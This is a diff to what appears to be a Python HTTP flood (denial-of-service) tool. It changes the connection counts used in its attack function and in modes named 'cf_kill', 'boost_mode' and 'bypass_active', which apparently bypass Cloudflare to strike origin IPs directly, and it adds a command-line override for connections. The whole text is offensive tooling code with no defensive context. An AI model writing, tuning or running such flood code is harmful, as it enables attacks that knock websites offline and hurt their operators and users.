@@ -1408,8 +1408,8 @@ async def http_attack(url, host, conns):
     for s_idx in range(session_count):
         conn_kwargs = {
             "ssl": ssl_ctx,
-            "limit": conns * 3,
-            "limit_per_host": 0,
+            "limit": conns,
+            "limit_per_host": conns,
             "force_close": force_close_conns,
             "enable_cleanup_closed": True,
             "ttl_dns_cache": 300,
@@ -1672,15 +1672,17 @@ def main():
             safe_print("< / > No accessible paths found, bypass will use random paths")
         safe_print("")
 
-    if cf_kill and direct_origin and origin_ips:
-        conns = min(600, max(300, 400 // 2 + 200))
+    if cli and cli.conns and cli.conns > 0:
+        conns = cli.conns
+    elif cf_kill and direct_origin and origin_ips:
+        conns = 120 // session_count
     elif boost_mode:
-        base_conns = min(800, max(400, 500 // 2 + 300))
-        conns = base_conns // session_count
+        conns = 150 // session_count
     elif bypass_active or cf_kill:
-        conns = min(400, max(200, 250 // 2 + 150))
+        conns = 90 // session_count
     else:
-        conns = 200
+        conns = 50
+    conns = max(1, conns)
 
     total_conns = conns * session_count
 
